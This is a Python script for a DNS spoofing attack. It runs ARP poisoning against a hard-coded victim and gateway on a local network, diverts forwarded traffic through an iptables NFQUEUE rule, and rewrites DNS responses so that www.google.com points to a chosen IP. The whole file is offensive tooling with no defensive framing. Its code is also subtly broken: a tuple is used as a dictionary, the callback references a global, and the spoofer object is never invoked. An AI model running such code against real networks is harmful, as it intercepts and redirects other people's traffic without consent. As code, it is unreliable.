from typing import Any
from netfilterqueue import NetfilterQueue
import os
import ArpPoison
import threading
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, Ether

class Dns_spoof:

    def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
        print('in init')
        self.queue_num = queue_num
        self.ipVictim = ipVictim
        self.ipServer = ipServer
        self.host = host

    def __call__(self) -> None:
        print('in call')
        arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(self.ipVictim, self.ipServer), daemon=True)
        arpThread.start()

        os.system(
            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
        self.queue = NetfilterQueue()
        self.queue.bind(self.queue_num, self.call_back)

        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}')
            print("iptables flushed")
        
    def call_back(self, bin_packet):
        print('packet being processed')
        packet = IP(bin_packet.get_payload())
        if packet.haslayer(DNSRR):
            try:
                queryName = packet[DNSQR].qname
                if queryName in self.host:
                    packet[DNS].an = DNSRR(
                        rrname=queryName, rdata=host[queryName])
                    packet[DNS].ancount = 1
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[UDP].len
                    del packet[UDP].chksum
            except IndexError as error:
                return False
            bin_packet.set_payload(bytes(packet))
        print('packet has been processed')    
        return bin_packet.accept()

if __name__ == '__main__':
    print('in main')
    host = ("www.google.com", "188.114.96.0")
    queue_num = 1
    ipVictim = '192.168.178.144' # The IP address of the victim
    ipServer = '192.168.178.1' # The IP address of the gateway   
    print('starting spoof') 
    x = Dns_spoof(queue_num, ipVictim, ipServer, host)    
    x
